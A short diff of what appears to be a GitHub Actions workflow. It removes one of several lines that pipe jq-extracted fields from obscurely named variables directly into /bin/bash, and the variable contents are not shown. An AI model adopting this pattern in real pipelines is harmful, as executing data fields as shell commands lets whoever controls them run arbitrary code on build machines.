@@ -22,7 +22,6 @@ jobs:
           echo $d14 | jq -r .t32 | /bin/bash
           printf '%s' "$so8291" | jq -r .wb467 | /bin/bash
           printf '%s' "$uhvg02" | jq -r .u5 | /bin/bash
-          printf '%s' "$v7195" | jq -r .k65606 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
